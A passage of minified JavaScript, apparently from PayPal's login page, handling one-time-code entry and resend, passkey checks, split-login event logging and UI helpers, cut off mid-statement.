window.PAYPAL=window.PAYPAL||{},function(){"use strict";function verifyOtp(){function o(){if(!s.checkEmpty(t))return s.checkValid(t)}function u(e){getEventTarget(e);eventStopPropagation(e),s.hideInvalidError(),s.hideError(!0)}function a(e){var t=getEventTarget(e);eventStopPropagation(e),s.checkValid(t),s.hideError()}function f(e){var t=getEventTarget(e);eventStopPropagation(e),s.checkValid(t)}function l(e){var u,a,f,l,r=document.querySelector("#token")||{},i=document.querySelector(".notifications"),s={};if(eventPreventDefault(e),a=(u=getEventTarget(e)).querySelectorAll("input")||[],f=u.querySelector("button"),o()){login.fn.updateFnSyncContext({sourceId:"OTP_LOGIN"}),login.fn.addFnSyncData(),$(i).text("");for(var p=0;p<a.length;p++)s[a[p].name]=a[p].value;l=$("body").data("loadStartTime"),login.utils.showSpinner(),$.ajax({url:u.getAttribute("action"),type:"POST",data:s,success:function h(e){if(login.utils.logCPLData({startTime:l,status:"success",flowName:"OTP"}),(e=e||{}).notifications&&(function c(e){$(i).text(""),e&&e.msg&&(i.innerHTML='<p class="notification '+e.type+'" role="alert">'+e.msg+"</p>")}(e.notifications),r.value=e._csrf,login.utils.hideSpinner()),e.disableSubmit&&f&&($(f).addClass("greyBackground"),$(".otpLoginViaLink")&&$(".otpLoginViaLink").remove(),f.setAttribute("disabled","disabled")),e.disableResend&&n&&($(n).addClass("greyOut"),n.removeAttribute("href")),PAYPAL.unifiedLoginInlinePostMessage)login.utils.sendPostMessage(e.showSuccess?"LOGIN_SUCCESS":"LOGIN_FAILED");else{if(e.showPassword&&(login.pubsub.publish("SHOW_PASSWORD"),login.utils.hideSpinner()),e.isCookieDisabledRequest&&e.accessToken&&e.returnUrl)return login.logger.log({evt:"OTP_LOGIN",data:"PROCESS_SLR_INTERNAL_REDIRECT",calEvent:!0}),login.logger.pushLogs(),login.utils.handleSlrInternalRedirect(e);e.returnUrl&&setTimeout((function(){window.location.href=e.returnUrl}),1e3)}},fail:function(){login.utils.logCPLData({startTime:l,status:"failure",flowName:"OTP"}),login.utils.hideSpinner()}})}else t.focus()}function c(e){function h(e){setTimeout((function(){$(t).removeClass("greyOut"),$(t).removeClass("hide"),t.setAttribute("href",l),e&&$(e).addClass("hide"),addEvent(r,"click",c)}),2e3)}var t=getEventTarget(e),n={},i=document.querySelector("#token")||{},s=document.querySelector("[name=challengeId]")||{},o=document.querySelector("[name=nonce]")||{},u=document.querySelector("[name=otpVariant]")||{},a=document.querySelector(".sent"),f=document.querySelector(".failed"),l=t.getAttribute("href");eventPreventDefault(e),removeEvent(t,"click",c),$(t).addClass("greyOut"),t.removeAttribute("href"),n[i.name]=i.value,n[s.name]=s.value,n[o.name]=o.value,n[u.name]=u.value,n.isResend="true",login.logger.log({evt:"state_name",data:"begin_verify_otp",instrument:!0}),login.logger.log({evt:"transition_name",data:"process_resend_sms",instrument:!0}),login.logger.pushLogs(),$.ajax({url:l,type:"POST",data:n,success:function p(e){var n=(e=e||{}).resendFailed?f:a;i.value=e._csrf,$(t).addClass("hide"),$(n).removeClass("hide"),h(n)},fail:function(){h()}})}var e=document.querySelector("form[name=verifyOtp]"),t=document.querySelector("#security_code"),n=document.querySelector("#resendLink"),r=document.querySelector(".resend"),s=(document.querySelector(".secondaryLink a"),function validateOneField(e,t,n){function u(e){$(r).addClass("hasError"),r.style["z-index"]=100,$(i).addClass("show"),t&&$(t).addClass("moveLeft")}function a(){$(s).removeClass("hide")}function f(){$(o).removeClass("hide")}function l(){$(s).addClass("hide")}var r=e.querySelector(".textInput"),i=r.querySelector(".errorMessage"),s=r.querySelector(".emptyError"),o=r.querySelector(".invalidError");return{showError:u,showRequiredError:a,checkEmpty:function p(e){var t;return!(e&&(t=e.value&&e.value.trim(),!$(e).hasClass("validateEmpty")||t||(u(),a(),0)))},showInvalidError:f,hideRequiredError:l,hideInvalidError:function c(){$(o).addClass("hide")},hideError:function h(e){e&&($(r).removeClass("hasError"),t&&$(t).removeClass("moveLeft")),r.style["z-index"]=1,$(i).removeClass("show")},checkValid:function d(e){var t;return!(!e||(t=e.value&&e.value.trim(),$(e).hasClass("validate")&&n(t)&&(l(),u(),f(),1)))}}}(e,r,(function(e){return e&&6!==e.length})));return{attachFormEvents:function h(){addEvent(e,"submit",l),addEvent(t,"keydown",u),addEvent(t,"focus",f),addEvent(t,"blur",a),addEvent(n,"click",c),addEvent(n,"focus",(function(){t.focus()})),t.focus()}}}function verifyOtpPrimary(e){function b(e){getEventTarget(e);eventStopPropagation(e)}function w(e){var t=e.which||e.keyCode;if(!(t===h||t===l&&e.key===p||t===c&&e.key===d)&&(-1!==o.indexOf(e.key)||!u.test(e.key)||e.target.value))return 9===t&&""===s.value?void n.focus():void e.preventDefault()}function E(e){var n=getEventTarget(e).index,r=e.which||e.keyCode,i=document.querySelector("#otp"+(n-1)),s=document.querySelector("#otp"+n),o=document.querySelector("#otp"+(n+1)),u=e.key===d||r===c,a=e.key===p||r===l;if(!u&&!a&&r!==h){if(e.preventDefault(),eventStopPropagation(e),v="manual_entry ",s.value)if(6===N().length)return void(y||(y=!0,A(v)));return s.value&&(r>=48&&r<=57||r>=96&&r<=105)?(s.value=e.key,void o.focus()):8===r||46===r?(s.value="",void(1!==n&&i.focus())):void(37!==r?(39!==r||6===n)&&(8===r&&46===r||6===n)||o.focus():1===n?s.focus:i.focus())}e.preventDefault()}function S(e){var t=getEventTarget(e);if(t.value.length>1){login.logger.log({evt:"HANDLE_INPUT",data:"INPUT_PIN_GREATER_THAN_ONE",calEvent:!0}),login.logger.pushLogs();var n=document.createElement("input");n.setAttribute("hidden",!0),document.body.appendChild(n),n.value=t.value;for(var r=n.value,s=0;s<r.length;s++)i[s].value=r[s],s<5&&i[s+1].focus();if(document.body.removeChild(n),6===N().length)return v="auto_entry",void setTimeout((function(){y||(y=!0,A(v))}),250)}}function x(e){for(var n=getEventTarget(e).index-1,s=(e.clipboardData||window.clipboardData).getData("Text"),o=0;o<s.length;o++)if(!T(s[o]))return void e.preventDefault();e.preventDefault();for(o=0;n<i.length&&o<s.length;)i[n].value=s[o],i[n].focus(),login.logger.log({evt:"HANDLE_PASTE",data:"PASTE_IN_INPUT_BOXES"+o,calEvent:!0}),o++,n++;if(login.logger.pushLogs(),6===N().length)return v="auto_entry",void setTimeout((function(){y||(y=!0,A(v))}),250)}function T(e){for(var t=0;t<e.length;t++)if(o.includes(e[t])&&!u.test(e[t]))return!1;return!0}function N(){for(var e="",t=0;t<i.length;t++)e+=i[t].value;return e}function C(){for(var e=0;e<i.length;e++)i[e].value=""}function L(){var e=document.querySelector("#verifyOtp"),t=e.querySelector("#otpVerification"),n=e.querySelector(".otpError");$(t).addClass("hide"),$(n).removeClass("hide")}function A(e){var o,h,n=document.querySelector("#token")||{},r=document.querySelector(".notifications"),i={},a=($("body").data("loadStartTime"),$("body").data("isCookiedUser")),f=$("body").data("isUvpaaExist"),l=$("body").data("allowPasskeyAutofill"),c=$("body").data("webAuthnEnrolledUser");o=document.querySelector("#verifyOtp").querySelectorAll("input"),login.logger.clientLog([{evt:"event_name",data:"identity_"+g+"otp_verify_screen_input_submitted",instrument:!0},{evt:"state_name",data:"begin_verify_"+g+"otp",instrument:!0},{evt:"transition_name",data:"prepare_verify_"+g+"otp_login",instrument:!0}]),login.utils.beaverLogger({transition_name:"submit_otp",status:"success",isRedirect:!0,state:"start"}),login.fn.updateFnSyncContext({sourceId:"OTP_LOGIN"}),login.fn.addFnSyncData(),$(r).text("");for(var b=0;b<o.length;b++)i[o[b].name]=o[b].value;i.security_code=N(),i.isUVPAAExist=f,i.isEmailOtp=m,l&&(i.allowPasskeyAutofill=l),c&&(i.webAuthnEnrolledUser=c),login.logger.log({evt:"entry_type",data:e,instrument:!0}),login.logger.pushLogs(),login.utils.showSpinner(),h=Date.now();try{login.utils.logCPLData({startTime:login.otp.getVerifyPageRenderEndTime(),status:"success",flowName:a?"OTP Login submit Cookied":"OTP Login submit Uncookied"})}catch(w){login.logger.log({evt:"UNIFIED_LOGIN",data:"cit_verify_otp_page_error_logging",calEvent:!0,status:"ERROR"}),login.logger.pushLogs()}$.ajax({url:"/signin/challenge/sms/solve",type:"POST",data:i,success:function v(e){if(y=!1,(e=e||{}).notifications&&(function d(e){$(r).text(""),e&&e.msg&&(r.innerHTML='<p class="notification '+e.type+'" role="alert">'+e.msg+"</p>")}(e.notifications),n.value=e._csrf,login.utils.hideSpinner(),C(),s.focus()),e.disableResend&&t&&L(),PAYPAL.unifiedLoginInlinePostMessage)login.utils.sendPostMessage(e.showSuccess?"LOGIN_SUCCESS":"LOGIN_FAILED");else{if(e.showPassword){if(e.isOtpSmsUser)return L(),void login.utils.hideSpinner();login.pubsub.publish("SHOW_PASSWORD"),login.utils.hideSpinner()}if(e.isCookieDisabledRequest&&e.accessToken&&e.returnUrl)return login.logger.log({evt:"OTP_LOGIN",data:"PROCESS_SLR_INTERNAL_REDIRECT",calEvent:!0}),login.logger.pushLogs(),login.utils.handleSlrInternalRedirect(e);login.loadResources&&login.loadResources.lazyload(),e.returnUrl&&(login.logger.log({evt:"transition_name",data:a?"cpl_otp_login_success_cookied":"cpl_otp_login_success_Uncookied",instrument:!0}),login.utils.logCPLData({startTime:h,status:"success",flowName:"OTP"}),setTimeout((function(){window.location.href=e.returnUrl}),1e3))}},fail:function(){y=!1,C(),s.focus(),login.logger.log({evt:"transition_name",data:a?"cpl_otp_login_failure_cookied":"cpl_otp_login_failure_Uncookied",instrument:!0}),login.utils.logCPLData({startTime:h,status:"failure",flowName:"OTP"}),login.utils.hideSpinner()}})}function O(e){function d(e,r){setTimeout((function(){"failed"===r?L():($(n).removeClass("greyOut"),$(n).removeClass("hide"),n.setAttribute("href",c),e&&$(e).removeClass("showToast"),addEvent(t,"click",O))}),2e3)}var n=getEventTarget(e),r={},i=document.querySelector("#token")||{},o=document.querySelector("[name=challengeId]")||{},u=document.querySelector("[name=nonce]")||{},a=document.querySelector("[name=otpVariant]")||{},f=document.querySelector(".sent"),l=document.querySelector(".failed"),c=n.getAttribute("href"),h=document.querySelector('input[name="isEmailOtp"]')&&"true"===document.querySelector('input[name="isEmailOtp"]').value,p=h?"email_":"";eventPreventDefault(e),removeEvent(n,"click",O),$(n).addClass("greyOut"),n.removeAttribute("href"),r[i.name]=i.value,r[o.name]=o.value,r[u.name]=u.value,r[a.name]=a.value,r.isResend="true",r.isEmailOtp=h,login.logger.clientLog([{evt:"event_name",data:"identity_"+p+"otp_verify_screen_resend_button_pressed",instrument:!0},{evt:"state_name",data:"begin_verify_"+p+"otp",instrument:!0},{evt:"transition_name",data:"process_resend_"+p+"code",instrument:!0}]),$.ajax({url:c,type:"POST",data:r,success:function v(e){s.focus();var t=(e=e||{}).resendFailed?l:f,r=e.resendFailed?"failed":"sent";i.value=e._csrf,$(n).addClass("hide"),$(t).addClass("showToast"),d(t,r)},fail:function(){d()}})}var v,t=document.querySelector("#resendLink"),n=document.querySelector("#tryAnotherWayLink"),i=(document.querySelector(".secondaryLink"),document.querySelectorAll("#security_code > *[id]")),s=document.querySelector("#otp1"),o=["-","+","e"],u=/^[0-9]$/,l=91,c=17,h=86,p="Meta",d="Control",m=document.querySelector('input[name="isEmailOtp"]')&&"true"===document.querySelector('input[name="isEmailOtp"]').value,g=m?"email_":"",y=!1;return{attachFormEvents:function M(){for(var e=document.querySelector('input[name="isEmailOtp"]')&&"true"===document.querySelector('input[name="isEmailOtp"]').value,s=($("#verifyOtp")&&!$("#verifyOtp").hasClass("hide")?"verify":"")+(e?"emailOtp":"otp"),o=login.utils.getPageNameByIntegrationType(s),u=0;u<i.length;u++){i[u].index=u+1;var a=document.querySelector("#otp"+(u+1));addEvent(a,"focus",b),addEvent(a,"keyup",E),addEvent(a,"keydown",w),addEvent(a,"paste",x),addEvent(a,"input",S)}addEvent(t,"click",O),addEvent(t,"focus",b),n&&(login.otp.showOnPwdPage(),login.utils.logTryAnotherWayInstrumentData({page:o,action:"linkShown"}),login.logger.pushLogs(),addEvent(n,"focus",b),login.utils.hideCurrentPageTawOption(s),addEvent(n,"click",(function(e){login.logger.log({evt:"state_name",data:"otp_login",instrument:!0}),login.logger.log({evt:"transition_name",data:"otp_try_another_way_clicked",instrument:!0}),login.logger.log({evt:"otp_login",data:"otp_try_another_way_clicked",calEvent:!0}),login.logger.pushLogs(),login.utils.logTryAnotherWayInstrumentData({page:o,action:"linkPressed"}),login.logger.pushLogs(),login.utils.showTryAnotherWayModal(e,{integrationType:s})})),login.utils.attachTryAnotherWayModalHandlers({integrationType:s}));var f=document.querySelector("#otp1");addEvent(f,"click",(function(e){f.focus()}));var l=navigator.userAgent.match(/Chrome\/([0-9]+)\./i),c="Google Inc."===window.navigator.vendor&&navigator.userAgent.match(/Android/i)&&l&&Number(l[1])>=84;if("true"===$("body").data("otpAutofillEntryEnabled")&&c&&window.OTPCredential){var p=new AbortController,d=document.querySelector("form[name=verifyOtp]");addEvent(d,"submit",(function(e){p.abort()})),navigator.credentials.get({otp:{transport:["sms"]},signal:p.signal}).then((function(e){if(function k(e){for(var t=0;t<i.length&&t<e.length;)i[t].value=e[t],i[t].focus(),t++}(e.code),6===N().length)return v="autofill_entry",void setTimeout((function(){A(v)}),250)})).catch((function(e){login.logger.log({evt:"OTP_AUTOFILL",data:"otp_autofill_failure"+e.toString(),calEvent:!0}),login.logger.pushLogs()}))}}}}function loadFeatures(){if($("body").data("qrCodeFeatureEnabled")&&login.qrCode.initialize(),login.core(),login.jwt&&login.jwt(),login.oneTouchLogin&&login.oneTouchLogin(),login.singleSignOn&&login.singleSignOn(),login.webAuthn){var e=$("body").data("partyIdHash"),t=$("body").data("webAuthnLoginContext");e&&t&&login.webAuthn.attachFormEvent(),login.webAuthn.setContext(),login.webAuthn.setPasskeyContext()}if(login.otp&&login.otp.prepareSendPage(),login.onboardingFlow&&login.onboardingFlow.prepareLandingPage(),login.noAccExists&&login.noAccExists.attachFormEvent(),login.ssoInterstitial&&login.ssoInterstitial.attachFormEvent(),login.oneTouch(),login.footer(),login.pwr(),login.ads.init(),login.siapple){var n=document.querySelector('input[name="appleIdpJson"]'),r=n&&n.value;login.siapple({appleIdpJson:r})}login.keychain&&login.keychain(),login.smartLock&&login.smartLock(),login.tpdLogin&&login.tpdLogin.initialize(),login.geoEnablement&&login.geoEnablement.setGeoMessage(),login.showHidePassword(),function setPasskeyEligibility(){const e=window.PublicKeyCredential;try{if(e&&e.isConditionalMediationAvailable&&e.isConditionalMediationAvailable()?login.logger.log({evt:"is_conditional_mediation",data:"true",instrument:!0}):login.logger.log({evt:"is_conditional_mediation",data:"false",instrument:!0}),!e||!e.isUserVerifyingPlatformAuthenticatorAvailable)return login.logger.log({evt:"is_uvpaa",data:"false",instrument:!0}),void login.logger.pushLogs();e.isUserVerifyingPlatformAuthenticatorAvailable().then((function(e){login.logger.log({evt:"is_uvpaa",data:e,instrument:!0}),login.logger.pushLogs()})).catch((function(){login.logger.log({evt:"is_uvpaa",data:"error",instrument:!0}),login.logger.pushLogs()}))}catch(t){login.logger.log({evt:"is_conditional_mediation",data:"error",instrument:!0}),login.logger.log({evt:"is_uvpaa",data:"error",instrument:!0})}}()}function logPreloadAssetsDownloadData(){var e=window.PAYPAL&&window.PAYPAL.ulData||{};if(e){var t=e.preloadScriptUrl?e.preloadScriptUrl.split(",").length:0,n=e.preloadScriptDownloadLength||0;login.logger.log({evt:"preload_total_assets",data:t,instrument:!0}),login.logger.log({evt:"preload_downloaded_assets",data:n,instrument:!0}),login.logger.pushLogs()}}function instrumentUlAsLandingPageLoad(){var t,e=document.querySelector("#password"),n=document.querySelector('input[name="locale.x"]'),r=document.querySelector('input[name="clientLogRecords"]');e&&(t=login.utils.isFieldPrefilled(e)||e.value.length>0);var i=$("body").data("oneTouchUser"),o=(window.PAYPAL&&window.PAYPAL.ulData||{}).aPayAuth;i||o||(login.logger.logServerPreparedMetrics(),r||(login.logger.log({evt:"state_name",data:login.utils.getKmliCb()?"LOGIN_UL_RM":"LOGIN_UL",instrument:!0}),login.logger.log({evt:"transition_name",data:"prepare_login_ul",instrument:!0})),login.logger.log({evt:"landing_page",data:"login",instrument:!0}),login.logger.log({evt:"is_pwd_autofill",data:t?"Y":"N",instrument:!0}),login.logger.log({evt:"is_pwd_autofill",data:t?"Y":"N",calEvent:!0}),login.logger.log({evt:"design",data:login.utils.isInContextIntegration()?"in-context":"full-context",instrument:!0}),n&&login.logger.log({evt:"page_lang",data:n.value,instrument:!0}),login.logger.pushLogs())}function instrumentSplitLoginPageLoad(e){var t="begin_email",n="prepare_email",r="unknown",i=login.utils.isFieldPrefilled(document.querySelector("#email")),s=document.querySelector('input[name="locale.x"]'),o=window.PAYPAL&&window.PAYPAL.slData&&window.PAYPAL.slData.slAction,u=$("body").data("oneTouchUser"),f=(window.PAYPAL&&window.PAYPAL.ulData||{}).aPayAuth,l=document.querySelector("#moreOptionsContainer"),c=$("body").data("ssoviatoken"),h=login.utils.isHybridLoginExperience(),p=document.querySelector("#forgotEmail"),d=document.querySelector("#forgotPassword"),v=document.querySelector(".cartWrapper");if(addEvent(p,"click",(function(){login.logger.log({evt:"state_name",data:t,instrument:!0}),login.logger.log({evt:"transition_name",data:"forgot_public_credential",instrument:!0}),login.logger.pushLogs()})),addEvent(d,"click",(function(){login.logger.log({evt:"state_name",data:t,instrument:!0}),login.logger.log({evt:"transition_name",data:"forgot_private_credential",instrument:!0}),login.logger.pushLogs()})),addEvent(v,"click",(function(){login.logger.log({evt:"state_name",data:t,instrument:!0}),login.logger.log({evt:"transition_name",data:"cart_currency_link_clicked",instrument:!0}),login.logger.pushLogs()})),!(u||f||c)&&"activation"!==o&&"optIn"!==o){if(h&&(t="begin_hybrid_login",n="prepare_hybrid"),"inputPassword"===e&&(t=h?"begin_hybrid_pwd":"begin_pwd",n=h?"prepare_hybrid_pwd":"prepare_pwd",n+=login.utils.getKmliCb()?"_ot":"",i=login.utils.isFieldPrefilled(document.querySelector("#password")),r="password"),"inputPhone"===e&&(t="begin_phone",n="prepare_phone"),"inputEmail"===e&&function trackHybridLoginRenderedEventInCal(){var e="checkout"===login.utils.getIntent(),t=$("body").hasClass("mobile")?"MOBILE":"DESKTOP";login.utils.isHybridLoginExperience()&&login.logger.log({evt:"HYBRID_LOGIN",data:"RENDERED"+(e?"_XO":"")+"_"+t,calEvent:!0})}(),l&&!$(l).hasClass("hide")&&"inputPassword"===e&&(n+="_more_opt",login.logger.log({evt:"exp_shown",data:"tpd",instrument:!0})),"inputPassword"===e){var m=document.querySelector("#phone");login.logger.log({evt:"pub_cred_type",data:m&&m.value?"phone":"email",instrument:!0})}login.logger.log({evt:"login_method",data:r,instrument:!0}),login.logger.log({evt:"state_name",data:t,instrument:!0}),login.logger.log({evt:"transition_name",data:n,instrument:!0}),login.logger.log({evt:"autofill",data:i?"Y":"N",instrument:!0}),login.logger.log({evt:"autofill",data:i?"Y":"N",calEvent:!0}),"checkout"===login.utils.getIntent()&&(login.logger.log({evt:"landing_page",data:"login",instrument:!0}),login.logger.log({evt:"design",data:login.utils.isInContextIntegration()?"in-context":"full-context",instrument:!0})),s&&login.logger.log({evt:"page_lang",data:s.value,instrument:!0}),login.logger.pushLogs()}}function autoLoginfallBackClientLog(e){var t=login.utils.getSplitLoginContext(),n=window.PAYPAL.ulData||{};e=e||{},document.querySelector("body").removeAttribute("data-one-touch-user"),n.aPayAuth=null,e.error_code&&login.logger.log({evt:"ext_error_code",data:e.error_code,instrument:!0}),t?instrumentSplitLoginPageLoad(t):instrumentUlAsLandingPageLoad()}function isAPaySupported(){var e=navigator.userAgent.match(/Chrome\/([0-9]+)\./i);return"Google Inc."===window.navigator.vendor&&"PaymentRequest"in window&&navigator.userAgent.match(/Android/i)&&e&&Number(e[1])>=58}var e,t,login={};login.logger=function(){function t(t){t.timestamp=Date.now?Date.now():(new Date).getTime(),e.push(t)}function n(t){var n,a,i=login.utils.getIntent(),s=login.utils.getFlowId(),o=$("body").data("loginLiteExperience"),u=login.utils.getCtxId();0!==e.length?(t=t||{},e.push({evt:"context_correlation_id",data:$("body").data("correlationId"),instrument:!0}),i&&(e.push({evt:"serverside_data_source",data:i,instrument:!0}),e.push({evt:"intent",data:i,instrument:!0}),e.push({evt:"ctx_login_intent",data:i,instrument:!0})),s&&e.push({evt:"context_id",data:s,instrument:!0}),o&&e.push({evt:"lite_experience",data:"Y",instrument:!0}),a={_csrf:(n=document.querySelector("#token")||document.querySelector('input[name="_csrf"]'))&&n.value,currentUrl:window.location.href,logRecords:JSON.stringify(e),intent:i},u&&(a.ctxId=u),"object"==typeof t.data&&Object.assign(a,t.data),$.ajax({url:"/signin/client-log",data:a,success:t.success,fail:t.fail,complete:t.complete}),e=[]):t&&t.complete()}var e=[];return{log:t,logServerPreparedMetrics:function s(){var t,n=document.querySelector('input[name="clientLogRecords"]');if(n)try{t=JSON.parse(n.value)}catch(r){}t&&(e=e.concat(t))},pushLogs:n,clientLog:function r(e,r,i){if(!((e=e||[])instanceof Array))return"function"==typeof r?r():void 0;for(var s=0;s<e.length;s++)t(e[s]);var o={complete:function(){if("function"==typeof r)return r()}};"object"==typeof i&&(o.data=i),n(o)},getStateName:function i(){var e=login.utils.getSplitLoginContext(),t=login.utils.isHybridLoginExperience(),r=document.getElementById("keepMeLoggedIn")?"LOGIN_UL_RM":"LOGIN_UL",i={inputEmail:"begin_email",implicitEmail:"begin_email",inputPassword:t?"begin_hybrid_pwd":"begin_pwd",inputPhone:"begin_phone"};return e&&i[e]&&(r=i[e]),t&&"inputPassword"!==e&&(r="begin_hybrid_login"),r}}}(),login.pubsub=(t={},(e={}).publish=function(e,n){if(!t[e])return!1;for(var r=t[e],i=r?r.length:0;i>0;)r[i-1].func(n),i-=1},e.subscribe=function(e,n){"function"==typeof n&&(t[e]||(t[e]=[]),t[e].push({func:n}))},e),login.store=function(t){var n=t||{};return{updateModel:function i(e){var t=document.querySelector("input[name=splitLoginContext]");e.splitLoginContext||(e.splitLoginContext=t&&t.value);var r=Object.assign({},n.model,e);r.notifications=e.notifications,r.tpdVariant=e.tpdVariant,r.showSpinnerUpfront=e.showSpinnerUpfront,r.enableSmartlock=e.enableSmartlock,r.tpdAutoSend=e.tpdAutoSend,r.webAuthnLoginContext=e.webAuthnLoginContext,r.qrCodeFeatureEnabled=e.qrCodeFeatureEnabled,r.qrcPrerenderEnabled=e.qrcPrerenderEnabled;var i=Object.assign({},n,{model:r});n=i,login.pubsub.publish("STATE_UPDATED",i)},getState:function r(){return n}}};var addEvent=function(e,t,n){e&&t&&n&&(e.addEventListener?e.addEventListener(t,n,!1):e.attachEvent&&e.attachEvent("on"+t,n))},removeEvent=function(e,t,n){e&&t&&n&&(e.removeEventListener?e.removeEventListener(t,n,!1):e.attachEvent&&e.detachEvent("on"+t,n))},createNewEvent=function(e){if("function"==typeof window.Event)return new Event(e);var t=document.createEvent("Event");return t.initEvent(e,!0,!0),t},eventPreventDefault=function(e){var t=e||window.event||{};t.preventDefault?t.preventDefault():t.returnValue=!1},eventStopPropagation=function(e){var t=e||window.event||{};t.stopPropagation?t.stopPropagation():t.cancelBubble=!0},getEventTarget=function(e){var t=e||window.event||{};return t.target||t.srcElement},triggerEvent=function(e,t){if(e&&t){var n=createNewEvent(t);e.dispatchEvent?e.dispatchEvent(n):e.fireEvent&&e.fireEvent("on"+t,n)}};login.utils=function(){function i(n){e&&(n&&n.qrCodeSpinner?$(e).addClass("qrcSpinner"):$(e).addClass("spinner"),n&&n.nonTransparentMask&&$(e).addClass("nonTransparentMask"),$(e).removeClass("hide"),e.setAttribute("aria-busy","true")),t&&$(t).removeClass("hide")}function s(){e&&($(e).removeClass("spinner"),$(e).removeClass("nonTransparentMask"),$(e).removeClass("qrcSpinner"),$(e).addClass("hide"),e.setAttribute("aria-busy","false")),t&&$(t).addClass("hide")}function u(e){return{password:"begin_hybrid_pwd",sms_otp:"begin_otp_interstitial",email_otp:"begin_email_otp_interstitial",verify_sms_otp:"begin_verify_otp",verify_email_otp:"begin_verify_email_otp",passkey:"begin_passkey_login",webauthn:"webauthn_login"}[e]||""}function p(){return"true"===$("body").data("isHybridLoginExperience")}function v(e,t,n,r){var u,a,f,s=e&&e.getAttribute("href");e&&e.getAttribute("id");return function(o){o.preventDefault(),login.logger.log({evt:"state_name",data:t||login.logger.getStateName(),instrument:!0}),login.logger.log({evt:"transition_name",data:n,instrument:!0}),(u=document.querySelector('input[name="locale.x"]'))&&login.logger.log({evt:"page_lang",data:u.value,instrument:!0}),(a=$(e).data("locale"))&&login.logger.log({evt:"change_to_lang",data:a,instrument:!0}),f={complete:function(){if("function"==typeof r)return r();window.location=s}},login.logger.pushLogs(f),i()}}function w(e,t,n){var r=document.querySelector("#initialSplitLoginContext"),i={_csrf:document.querySelector("#token").value,notYou:!0,intent:F(),context_id:R(),ctxId:vt()};r&&(i.initialSplitLoginContext=r.value),document.body.removeAttribute("data-web-authn-login-context"),$.ajax({type:"POST",url:"/signin/not-you",data:i,dataType:"json",success:e,fail:t,complete:function(){if("function"==typeof n)return n()}})}function E(){var e=document.querySelector(".rewardsBar"),t=document.querySelector(".rewardsBarMobile");return e&&e.getAttribute("data-type")||t&&rewardsBarMbile.getAttribute("data-type")}function x(){return/^\s+|\s+$/}function T(){return/^\S+@\S+\.\S+$/}function N(){return/\s/g}function k(e){login.storeInstance&&login.storeInstance.updateModel(e),e.ulSync&&login.fn.updateFnSyncContext(e.ulSync),!e.showSpinnerUpfront&&"linked"!==e.smartlockStatus&&s()}function L(){var e=document.querySelector(".onboardingFlowContentKey"),t=document.querySelector(".pwdContentKey");$("body").data("pwdContentKeyExists")&&(t&&$(t).removeClass("hide"),e&&$(e).addClass("hide"))}function A(){eventPreventDefault(),login.logger.log({evt:"button_label",data:"login_with_webauthn",instrument:!0}),login.logger.log({evt:"try_another_way",data:"login_with_webauthn_clicked",calEvent:!0});return login.logger.pushLogs({complete:function(){var e=$("input[name=requestUrl]")&&$("input[name=requestUrl]").val();if(!e)return login.logger.log({evt:"int_error_desc",data:"invalid_url",instrument:!0}),login.logger.log({evt:"ERROR",data:"invalid_url",calEvent:!0}),login.logger.pushLogs();e=login.utils.updateParamValue(e,"loginType","webAuthn"),window.location.href=e},data:{logStartTime:Date.now()}})}function O(e,t){$("body").data("loadStartTime"),$("body").data("isCookiedUser");var i=document.querySelector('input[name="ctxId"]'),o=document.querySelector("form[name=login]"),u=$("#headerText"),a=$("#newUserContainer"),f=$("#signupContainer"),l=document.querySelector('#main section[id="onboardingFlow"]'),c=document.querySelector('#main section[id="otpLogin"]'),h=document.querySelector('#main section[id="verifyOtp"]'),p=$(".startOnboardingFlow"),d=$("body").data("usePassKey"),v=$("body").data("disablePasskeyEmailSubmit"),m=document.getElementById("btnNext"),g=$("#tryAnotherWayLinkContainer"),b=(document.querySelectorAll("#beginOtpLogin"),document.querySelector("#guestCheckout")),w=b&&b.parentElement,E=document.querySelector("#loginWithWebauthn"),S=E&&E.parentElement,x=document.querySelector('#main section[id="login"] .rewardsBar'),T=e&&e.contextualLogin&&e.contextualLogin.isPomaAccount,N=$("#setupPassword"),C=$("#forgotPassword"),M=Date.now();try{var _;(_=JSON.parse(window.localStorage.getItem("ulData"))||{}).ts=M,window.localStorage.setItem("ulData",JSON.stringify(_))}catch(D){login.logger.log({evt:"UNIFIED_LOGIN",data:"local_storage_error_out",calEvent:!0,status:"ERROR"}),login.logger.pushLogs()}if(x&&!$(x).hasClass("hide")&&$(x).addClass("hide"),m&&m.removeAttribute("submit"),!(!(e&&e.webAuthnLoginContext&&e.passkeyLoginEligible&&d)||v||t&&t.suppressPassKey||$("input[name=suppressPassKey]")))return $("body").attr("data-web-authn-login-context",e.webAuthnLoginContext),"undefined"!=typeof autofillAbortController&&autofillAbortController.abort(),void login.webAuthn.performWebAuthnLogin({usePassKey:!0},(function(){login.logger.log({evt:"TAW_ELIGIBLE_REASON",data:"PASSKEY",calEvent:!0,status:"SUCCESS"}),$(S).removeClass("hide"),addEvent(E,"click",(function(){login.utils.logTryAnotherWayInstrumentData({page:"password",action:"menuPressed",option:"biometrics"}),A()})),g&&e.pwdShowTryAnotherWay&&(g.removeClass("hide"),login.utils.logTryAnotherWayInstrumentData({page:"password",action:"linkShown"})),login.logger.pushLogs(),O(e,{suppressPassKey:!0})}));if(e.guestCheckoutTeslaSignUp&&e.guestCheckoutTeslaSignUp.isRequired&&(login.utils.attachGuestCheckoutTeslaSignUpHandlers(),function Zt(){var e=$("#guestCheckoutTeslaSignUp"),t=$(".tesla-signup-modal-content");e.addClass("transitioned"),t.addClass("transitioned"),e.removeClass("hide"),login.logger.log({evt:"guest_checkout_tesla_signup_sheet",data:"guest_checkout_tesla_signup_sheet_render",calEvent:!0}),login.logger.pushLogs()}()),L(),l&&($(l).remove(),$("#login").removeClass("hide")),c&&($(c).remove(),$("#login").removeClass("hide")),h&&($(h).remove(),$("#login").removeClass("hide")),e&&e.overlay&&e.overlay.variant){document.body.setAttribute("data-overlay-variant",e.overlay.variant),document.body.setAttribute("data-overlay-content-version",e.overlay.contentVersion||""),login.loadResources&&login.loadResources.lazyload();var 